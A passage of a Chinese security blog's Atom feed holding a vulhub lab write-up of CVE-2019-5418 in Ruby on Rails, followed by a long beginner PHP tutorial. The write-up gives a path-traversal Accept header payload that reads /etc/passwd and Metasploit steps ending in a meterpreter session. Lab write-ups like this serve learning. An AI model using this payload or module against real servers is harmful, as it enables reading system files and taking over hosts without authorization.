&lt;p&gt;Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="CVE" scheme="https://sinky.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>vulhub之CVE-2019-5418</title>
    <link href="https://sinky.top/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/"/>
    <id>https://sinky.top/2022/11/24/vulhub%EF%BC%9ACVE-2019-5418/</id>
    <published>2022-11-24T02:56:50.254Z</published>
    <updated>2022-11-25T05:58:41.004Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png" alt="image.png"></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>Ruby on Rails是一个Web应用程序框架，构建在Ruby语言上。</p><p>在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。</p><p>通过传入<code>Accept:../../../../../../../etc/passwd\{\{</code> 头来构造路径穿越漏洞，读取任意文件。</p><h2 id="漏洞利用方法一"><a href="#漏洞利用方法一" class="headerlink" title="漏洞利用方法一"></a>漏洞利用方法一</h2><p>访问index.php（随便输入的）报错，报错页面有个<code>robots</code>路径。</p><p><img src="https://s2.loli.net/2022/11/24/ZVbqw63aJUHlmk8.png" alt="image.png"></p><p>访问一下：</p><p><img src="https://s2.loli.net/2022/11/24/8p9YzNMK2vejF64.png" alt="image.png"></p><p>不知道，抓包看看：</p><p><img src="https://s2.loli.net/2022/11/24/XRMlnKUzOFqZjNk.png" alt="image.png"></p><p>修改Accept:</p><p><img src="https://s2.loli.net/2022/11/24/VK1SO7xEFPI2kca.png" alt="image.png"></p><p>成功读取<code>/etc/passwd</code></p><h2 id="漏洞利用方法二"><a href="#漏洞利用方法二" class="headerlink" title="漏洞利用方法二"></a>漏洞利用方法二</h2><p>利用kali中的MSF进行漏洞利用</p><pre><code class="hljs">msfconsole # 启动search rails # 查找rails相关模块use 4 #选择模块</code></pre><p><img src="https://s2.loli.net/2022/11/24/siNFGewlkHa38YM.png" alt="image.png"></p><pre><code class="hljs">show options # 展示配置选项</code></pre><p><img src="https://s2.loli.net/2022/11/24/HUrDNV1AJjtawxq.png" alt="image.png"></p><p>设置Rhost,rport,route参数，直接run运行后成功拿到meterpreter。</p><p><img src="https://s2.loli.net/2022/11/24/Hy1FaMBGNERCZDb.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/11/24/ft2X6wep4P39igT.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="CVE" scheme="https://sinky.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>php学习</title>
    <link href="https://sinky.top/2022/11/23/php%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/11/23/php%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-23T01:56:57.868Z</published>
    <updated>2022-12-06T08:11:04.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网站基本概念"><a href="#网站基本概念" class="headerlink" title="网站基本概念"></a>网站基本概念</h1><ol><li>服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）<ol><li>web服务器：提供web服务（网站访问），需要安装web服务软件，Apache,tomcat,iis等</li></ol></li><li>IP：网络互连协议，为计算机网络相互连接进行通信而设计的协议，IP地址具有唯一性（每台电脑都有一个唯一的IP地址）</li><li>域名：由遗传用点分割的名字组成（<code>www.baidu.ccom</code>）的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位，一个域名的目的是便于记忆和沟通的一组服务器的地址。<ol><li>特殊IP:<code>127.0.0.1</code> 代表本机</li><li>特殊域名：<code>localhost.com</code></li></ol></li><li>DNS:域名系统，作为域名和IP地址相互映射的一个分布式数据库，使用户更方便的访问互联网，通过主机名，得到该主机名对应的IP地址的过程叫做域名解析。<ol><li><code>用户输入域名 localhost -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑</code></li></ol></li><li>端口：(port) 设备与外界通讯交流的出口，分为虚拟端口和物理端口<ol><li>虚拟端口：指计算机内部或交换机路由器内的端口，不可见，如80端口、21、23等；</li><li>物理端口：又称为接口，时可见接口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口<br> 3.<code>用户输入域名 localhost:端口 -&gt; DNS(localhost 127.0.0.1) -&gt; 服务器电脑 -&gt; 软件（服务）</code></li></ol></li></ol><h1 id="Web程序的访问流程"><a href="#Web程序的访问流程" class="headerlink" title="Web程序的访问流程"></a>Web程序的访问流程</h1><p>web分为两类：静态网站和动态网站</p><p>浏览器发起访问-&gt; DNS解析域名-&gt; 服务器电脑-&gt; 服务软件</p><h2 id="静态网站的访问"><a href="#静态网站的访问" class="headerlink" title="静态网站的访问"></a>静态网站的访问</h2><p>访问<code>http://localhost:80/index.html</code></p><p><img src="https://s2.loli.net/2022/11/15/9Zne3TXqFwEQaxY.png" alt="image.png"></p><h2 id="动态网站访问"><a href="#动态网站访问" class="headerlink" title="动态网站访问"></a>动态网站访问</h2><p>与静态类似，但比静态多出两个内容：服务器端解析、数据库。</p><p>访问<code>http://localhost:80/index.php</code></p><p><img src="https://s2.loli.net/2022/11/15/raP1p2C7BzXuUWI.png" alt="image.png"></p><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>安个phpstudy就行了</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>php是一种运行在服务器端的脚本语言，可以嵌入到html中</p><h1 id="php代码标记"><a href="#php代码标记" class="headerlink" title="php代码标记"></a>php代码标记</h1><pre><code class="hljs">ASP标记： &lt;%php代码 %&gt; # 已弃用短标记： &lt;?php代码?&gt; # 已弃用脚本标记： &lt;script language="php"&gt;php代码&lt;/script&gt;//----------------------例子：&lt;html&gt;    &lt;body&gt;        &lt;b&gt;            &lt;script language="php"&gt;                //脚本标记                echo 'hello world';            &lt;/script&gt;        &lt;/b&gt;    &lt;/body&gt;&lt;/html&gt;//-----------------------------标准标记（常用）： &lt;?php php代码?&gt;</code></pre><h1 id="php注释"><a href="#php注释" class="headerlink" title="php注释"></a>php注释</h1><p>行注释： <code>//</code></p><p>块注释： <code>/*…*/</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//注释</span><br><span class="hljs-comment">/* balbala</span><br><span class="hljs-comment">balaba</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">"Hello world!"</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h1 id="语句分隔符"><a href="#语句分隔符" class="headerlink" title="语句分隔符 ;"></a>语句分隔符 <code>;</code></h1><ol><li>php中标记结束符<code>?&gt;</code>有自带语句结束符效果，最后一行php代码可以没有语句结束符。</li><li>php中很多代码书写并不是嵌入到html中，而是单独存在，通常书写习惯中不建议使用标记结束符，php会自动从开始到最后全部认为是php代码。</li></ol><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>基本概念：用于存储数据，存在名字，可以通过名字访问数据，可以改变数据</p><p>php中所有变量都必须使用<code>$</code>符号。</p><p>删除变量：<code>unset()</code></p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//变量</span><br>    <span class="hljs-comment">//定义变量：在php中不需要任何关键字定义变量(赋值)</span><br><span class="hljs-variable">$var1</span>; <span class="hljs-comment">//定义变量</span><br><span class="hljs-variable">$var2</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">//定义同时赋值</span><br><span class="hljs-comment">//访问变量</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span>;<br><span class="hljs-comment">//修改变量</span><br><span class="hljs-variable">$var2</span>=<span class="hljs-number">2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;hr/&gt;'</span>,<span class="hljs-variable">$var2</span>; <span class="hljs-comment">//hr是一个横线</span><br><span class="hljs-comment">//删除变量unset()</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$var2</span>);<br><span class="hljs-comment">//echo $var2;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h2><ol><li>在php中变量以<code>$</code>符号开始</li><li>名字由字母、数字、下划线构成，不能以数字开头</li><li>php中本身允许中文变量(不建议)</li></ol><p>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据(预定义变量都是数组)</p><pre><code class="hljs">$_GET: 获取所有表单以get方式提交的数据$_POST: POST提交的数据都会保存在此$_REQUEST: GET和POST提交的都会保存$GLOBALS: PHP中所有的全局变量$_SERVER: 服务器信息$_SESSION: session会话数据$_COOKIE: cookie会话数据$_ENV: 环境信息$_FILES: 用户上传的文件信息</code></pre><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>如果一个变量保存的值刚好是另一个变量的名字，那么可以直接通过访问一个变量得到另一个变量的值，在变量前面再多加一个<code>$</code>符号。</p><pre><code class="hljs">$a='b';$b='bb';echo $a;echo $$a;</code></pre><h2 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h2><p>将一个变量赋值给另外一个变量。</p><p>值传递<code>$</code>：将变量保存的值复制一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p><p>引用传递<code>&amp;</code>：将变量保存在值所在的内存地址，传递给另外一个变量，两个变量指向同一块内存空间（两个变量是同一个值）</p><p>内存分区：</p><p>栈区：程序可以操作的内存部分（不存数据，运行程序代码），少但是快</p><p>代码段：存储程序的内存部分（不执行）</p><p>数据段：存储普通数据（全局区和静态区）</p><p>堆区：存储复杂数据，大但效率低</p><pre><code class="hljs">&lt;?php    $a=10;    $b=$a;    $b=5;    echo $a,$b,'&lt;br/&gt;';    $c=10;    $d=&amp;$c;    $c=5;    echo $c,$d,'&lt;br/&gt;';?&gt;</code></pre><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>保存数据</p><p>常量：const/constant，一种在程序运行中，不可改变的量（数据）</p><p>常量定义后不可改变</p><h2 id="常量定义形式"><a href="#常量定义形式" class="headerlink" title="常量定义形式"></a>常量定义形式</h2><ol><li><p>定义常量的函数：define(‘常量名’,常量值);</p></li><li><p>const常量名</p><p> define(‘PI’,3.14);<br> const PII=3;</p></li></ol><h2 id="常量的命名规则"><a href="#常量的命名规则" class="headerlink" title="常量的命名规则"></a>常量的命名规则</h2><ol><li>不需要$</li><li>由字母、数字、下划线组成，不能以数字开头</li><li>通常都是大写字母，不区分大小写，但是要跟变量区分开</li><li>特殊常量只能用define定义</li></ol><h2 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h2><pre><code class="hljs">PHP_VERSION # php版本号PHP_INT_SIZE # 整型大小PHP_INT-MAX # 整型能表示的最大值（允许出现负数：带符号）</code></pre><p>系统魔术常量：</p><pre><code class="hljs">__常量名__</code></pre><p>魔术常量值通常会跟着环境变化，但用户改变不了</p><pre><code class="hljs">__DIR__ # 当前被执行的脚本所在的绝对路径__FILE__ # 当前被执行的脚本所在的绝对路径__LINE__ # 当前所属的行数__NAMESPACE__ # 当前所属的命名空间__CLASS__ # 当前所属的类__METHOD__ # 当前所属的方法</code></pre><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><pre><code class="hljs">data type </code></pre><p>在php中指的是存储的数据本身的类型，而不是变量的类型。php是一种弱类型语言，变量本身没有数据类型。</p><h2 id="八种数据类型"><a href="#八种数据类型" class="headerlink" title="八种数据类型"></a>八种数据类型</h2><ul><li>基本数据类型：<ul><li>整型：int/integer，系统分配4个字节存储，表整数类型</li><li>浮点型：float/double，系统分配8个字节存储，表小数或整型存不下的整数</li><li>字符串型：string，系统根据实际长度分配，表示字符串(引号)</li><li>布尔类型：bool/boolean，表布尔类型</li></ul></li><li>复合数据类型：<ul><li>对象类型：object，存放对象</li><li>数组类型：array，存储多个数据（一次性）</li></ul></li><li>特殊数据类型<ul><li>资源类型：resource，存放资源数据（php外部数据，如数据库、文件）</li><li>空类型：NULL，只有一个值就是NULL(不能运算)</li></ul></li></ul><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><ul><li>自动转换</li><li>手动转换（强制）：认为根据需要的目标类型转换<ul><li>强制转换规则：在变量之前增加一个括号(),然后在里面写上对应类型：int/integer,其中NULL类型用到unser()结构</li></ul></li><li>布尔true为1，false为0</li><li>字符串转数值<ul><li>以字母开头的字符串，永远为0</li><li>以数字开头的字符串，取到碰到字符串为止（不会同时包含两个小数点）</li></ul></li></ul><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//数据类型</span><br><span class="hljs-comment">//创建数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">'abc1.1.1'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'1.1.1abd'</span>;<br><span class="hljs-comment">//自动转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//强制转换</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;br/&gt;'</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$a</span>,(<span class="hljs-keyword">float</span>)<span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br>注：运行完页面有warning<br></code></pre></td></tr></tbody></table></figure><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>通过类型判断函数来判断变量，最终返回这个变量所保存数据的数据类型：是一组以is_开头后面跟类型名字的函数：is_XXX(变量名)</p><p>Bool类型不能用echo查看，可以用var_dump结构查看</p><blockquote><p>echo只能输出变量的值,var_dump能将变量的值和类型同事输出</p></blockquote><pre><code class="hljs">var_dump(变量1,变量2)var_dump(is_int($a));var_dump(is_string($a)); # bool(false) bool(true)</code></pre><ul><li>gettype(变量名) ：获取类型，得到该类型对应字符串</li><li>settype(变量名，类型)：设定数据类型，与强制转换不同<ul><li>强制转换变量名，是对数据值复制的内容进行处理（不会处理实际存储的内容）</li><li>settype会直接改变数据本身</li></ul></li></ul><figure class="highlight elm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($a); #string<br><span class="hljs-title">var_dump</span>(set<span class="hljs-keyword">type</span>($b,'int'));<br><span class="hljs-title">echo</span> get<span class="hljs-keyword">type</span>($b),$b; # stringbool(true) integer 1<br></code></pre></td></tr></tbody></table></figure><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>4字节，最大32位，有符号类型（区分正负数）</p><p>四种整型定义：</p><pre><code class="hljs">$a=120 # 十进制$a=0b110 # 二进制$a=0120 # 八进制$a=0x120 # 十六进制</code></pre><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><pre><code class="hljs">Decbin() # 十转二Decoct() # 十转八Dechex() # 十转十六Bindec() # 二转十</code></pre><p>栗子：<br>    var_dump(decbin(107)) # string(7) “110101</p><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>精度范围大概在15个有效数字左右</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f1</span>=<span class="hljs-number">1.23</span>; <span class="hljs-comment"># float(1.23)</span><br><span class="hljs-variable">$f2</span>=<span class="hljs-number">1.23e10</span>; <span class="hljs-comment"># float(12300000000)</span><br><span class="hljs-variable">$f3</span>=PHP_INT_MAX +<span class="hljs-number">1</span>; <span class="hljs-comment"># float(9.2233720368548E+18) </span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f1</span>,<span class="hljs-variable">$f2</span>,<span class="hljs-variable">$f3</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><pre><code class="hljs">$b1=True;$b2=False;var_dump($b1,$b2);</code></pre><p>在进行某些数据判断时,要特别注意类型转换:</p><pre><code class="hljs">empty() # 判断数据的值是否为空,不是NULL,若为空返回true,不为空返回falselsset() # 判断数据存储的变量本身是否存在,存储</code></pre><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>运算符:operator</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><pre><code class="hljs">= 赋值运算,将右边结果保存到内存的某个位置,将位置的内存地址赋值给左侧的变量</code></pre><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>加 <code>+</code></p><p>减 <code>-</code></p><p>乘 <code>*</code></p><p>除 <code>/</code></p><p>取余 <code>%</code></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$b</span>=<span class="hljs-number">10</span>; <span class="hljs-regexp">//</span>连贯赋值运算：俩变量不同<br><span class="hljs-variable">$c</span>=<span class="hljs-number">0</span>;<br>var_dump(<span class="hljs-variable">$a</span>/<span class="hljs-number">2</span>);<br></code></pre></td></tr></tbody></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较两个数据大小<br><code>&gt;、&gt;=、&lt;、&lt;=、==、!=、===、!==</code></p><p><code>===</code> 全等于，左右大小和类型都相同。</p><p><code>!==</code> 不全等于，只有大小或者类型不同。</p><pre><code class="hljs">$a='123';$b=123;var_dump($a==$b); // Truevar_dump($a===$b);// False</code></pre><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><ul><li>逻辑与：<code>&amp;&amp;</code> 全真为真</li><li>逻辑或：<code>||</code> 一真为真</li><li>逻辑非：<code>!</code> 取反</li></ul><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'weekend'</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">'goods'</span>;<br>var_dump(<span class="hljs-variable">$a</span> &amp;&amp; <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(<span class="hljs-variable">$a</span> || <span class="hljs-variable">$b</span>);<span class="hljs-regexp">//</span> True<br>var_dump(!(<span class="hljs-variable">$b</span>==<span class="hljs-string">'good'</span>));<span class="hljs-regexp">//</span> True<br></code></pre></td></tr></tbody></table></figure><p>逻辑与和逻辑或又称为短路运算，若第一个表达式结果已经满足条件，那么就不会运行逻辑运算符后面的表达式。</p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h2><p>将字符串拼接：<code>.</code><br>    .= 复合运算，将左右连接，然后重新赋值给左边。</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span>=<span class="hljs-string">'hello '</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-number">123</span>;<br>echo <span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span>,<span class="hljs-string">'&lt;hr/&gt;'</span>; <span class="hljs-regexp">//</span>将a和b连接起来<br><span class="hljs-variable">$a</span> .= <span class="hljs-variable">$b</span>; <span class="hljs-regexp">//</span><span class="hljs-variable">$a</span>=<span class="hljs-variable">$a</span> . <span class="hljs-variable">$b</span><br>echo <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></tbody></table></figure><h2 id="错误抑制符"><a href="#错误抑制符" class="headerlink" title="错误抑制符"></a>错误抑制符</h2><p>在php中一些错误可以提前预知，但错误无法避免，又不希望报错给用户，可以使用错误抑制扶处理。</p><pre><code class="hljs">@ 在可能出错的表达式前面使用即可</code></pre><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>=10;</span><br><span class="hljs-meta"><span class="hljs-keyword">$b</span>=0;</span><br>@(<span class="hljs-symbol">$</span>a/<span class="hljs-symbol">$</span>b);<br></code></pre></td></tr></tbody></table></figure><p>错误抑制符通常在生产环境用到；</p><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><p>有三个表达式参与的运算（简单的分支结构缩写）</p><p>语法格式： 表达式1 ? 表达式2 : 表达式3;</p><p>运算：若1成立，那么执行2，否则执行3；</p><pre><code class="hljs">$a=10;$b=$a&gt;10?100:0;echo $b;</code></pre><h2 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h2><p><code>++ --</code></p><pre><code class="hljs">$a=1;$a++;//++$a;//前置后置若本身只有自操作不参与其他运算，那么效果相同$a=1;$b=$a++; // $a++会导致$a=$a+1=2;$b=1$c=++$a; // ++$a会导致$a=$a+1=2;$c=2后置自操作：先将自己所保存的值留下来，然后改变自己，自己给别人原来的值前置自操作：先改变自己，然后将改变后的值传递。&lt;?php$a=$b=1;$a++;//++$b;echo $a,'&lt;br/&gt;',$b;echo '&lt;br/&gt;',$a++,'&lt;br/&gt;',++$b;echo '&lt;br/&gt;',$a,$b;?&gt;/+=: 左边结果与右边结果相加后赋值给左边/-=: 左边减去右边的结果赋值给左边</code></pre><h1 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h1><p>计算机码：原码、反码、补码，数值本身最左边一位是用来充当符号位：正数为0，负数为1</p><p>原码：数据本身从十进制转换成二进制得到的结果</p><ul><li>正数：左符号位为0</li><li>负数：左符号位为1</li></ul><p>反码：针对负数，符号位不变，其他位取反</p><p>补码：针对负数，反码+1</p><p>系统中存在两个0：</p><ul><li><code>+0</code> : 00000000</li><li><code>-0</code> : 10000000 原码</li></ul><p>取反： 11111111</p><p>补码：00000000</p><h1 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h1><p>取出计算机中最小的单位(位bit)进行运算</p><p><code>&amp;</code> ：按位与，11则1</p><p><code>|</code> : 按位或，有1则1</p><p><code>~</code> : 按位非，1则0，0则1</p><p><code>^</code> : 按位异或，相同则0，不同则1</p><p><code>&lt;&lt;</code> : 按位左移，整个位(32位)，左移一位，右边补0(乘以2)</p><p><code>&gt;&gt;</code> : 按位右移，整个位右移，左边补符号位对应内容(正数补0，负数补1)（除以2）</p><p>注意：</p><ol><li>系统进行任何位运算的时候都是使用补码</li><li>运算结束之后都必须转换原码才是最终显示数据</li></ol><h1 id="优先级略"><a href="#优先级略" class="headerlink" title="优先级略"></a>优先级略</h1><h1 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h1><h2 id="if条件判断语句"><a href="#if条件判断语句" class="headerlink" title="if条件判断语句"></a>if条件判断语句</h2><pre><code class="hljs">if(条件表达式){    //执行代码段；}else{    //执行代码段；}if(条件表达式1){    //执行代码段；}elseif(条件表达式2){    //执行代码段；}else{    //执行代码段；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }else{        echo 'work';    }?&gt;&lt;?php    $day='sunday';    if($day=='sunday'){        echo 'play';    }elseif($day='Saturday'){        echo 'play!';    }else{        echo 'work';    }?&gt;</code></pre><h2 id="Switch分支语句"><a href="#Switch分支语句" class="headerlink" title="Switch分支语句"></a>Switch分支语句</h2><pre><code class="hljs">switch(条件表达式){    case 值1:        代码段；        break;    case 值2:        代码段；        break;    …    default:        //匹配失败的代码;        break;}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    $day=1;    switch ($day) {        case 1:            echo '1';            break;        case 2:            echo '2';            break;        case 3:            echo '3';            break;        default:            echo 'error';            break;    }?&gt;</code></pre><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="hljs">for([条件1];[条件2];[条件3]){    //条件1：初始化，可以多种赋值语句，逗号分开    //条件2：边界判断，限定循环执行次数    //条件3：执行条件变化    循环体；}</code></pre><p>栗子：</p><pre><code class="hljs">&lt;?php    for($i=1;$i&lt;=10;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;&lt;?php    for($i=1,$end=10;$i&lt;=$end;$i++){        echo $i,'&lt;br/&gt;';    }?&gt;</code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre><code class="hljs">条件初始化；while(条件表达式){    //条件表达式就是判断边界条件    循环体；}</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    while($i&lt;=10){        echo $i++,'&lt;br/&gt;';    }?&gt;</code></pre><p>do-while循环：先执行循环体后判断条件</p><pre><code class="hljs">do{    循环体}while(条件表达式)</code></pre><p>例：</p><pre><code class="hljs">&lt;?php    $i=1;    do{        if($i%2==0){            echo $i,'&lt;br/&gt;';            }    $i++;    }while($i&lt;=10);?&gt;</code></pre><h2 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h2><p>中断控制：continue</p><p>终止控制：break</p><pre><code class="hljs">&lt;?php    //输出1-100之间5的倍数    $i=1;    while($i&lt;=100){        if($i%5==0){            echo $i++,'&lt;br/&gt;';        }        $i++;        continue;        //break; 终止循环    }?&gt;</code></pre><ul><li><code>continue 2;</code> 当前自己循环后面内部不再执行，同时外部循环如果还有循环体也不再执行，重新来过。</li><li><code>break 2;</code> 当前循环和次外一层循环都结束</li></ul><h1 id="流程控制替代语法"><a href="#流程控制替代语法" class="headerlink" title="流程控制替代语法"></a>流程控制替代语法</h1><p>分支和循环结构的替代语法</p><p>php本身是嵌入到html中的脚本语言，需要在html中书写一些关于判断或者循环的结构语法，必须符合php标签规范，需要html和php进行混搭，如果使用原始的php代码那么会非常不美观。</p><p>例子：打印九九乘法表，使用表格来展示。</p><pre><code class="hljs">&lt;table border=1&gt;    &lt;?php for($i=1;$i&lt;10;$i++){?&gt;        &lt;tr&gt;            &lt;?php for($j=1;$j&lt;=$i;$j++){?&gt;                &lt;td&gt;                    &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;                &lt;/td&gt;            &lt;?php }?&gt;        &lt;/tr&gt;    &lt;?php }?&gt;&lt;/table&gt;</code></pre><p>在php书写html中大括号<code>{}</code>不美观，所以php提供了一种替代机制：</p><pre><code class="hljs">for(;;){ -&gt;  for(;;):}        -&gt;  endfor;</code></pre><p>例子：</p><pre><code class="hljs">&lt;?php for($j=1;$j&lt;=$i;$j++):?&gt;    &lt;td&gt;        &lt;?php echo $i.' * '.$j.' = '.$i*$j;?&gt;    &lt;/td&gt;&lt;?php endfor;?&gt;</code></pre><p>左大括号用冒号替代</p><p>右大括号使用end+对应实际标记替代</p><pre><code class="hljs">if(): endif;switch: endswitch;</code></pre><h1 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网站基本概念&quot;&gt;&lt;a href=&quot;#网站基本概念&quot; class=&quot;headerlink&quot; title=&quot;网站基本概念&quot;&gt;&lt;/a&gt;网站基本概念&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;服务器：提供计算机服务的机器，取决于机器上所安装的软件（服务软件）&lt;ol&gt;
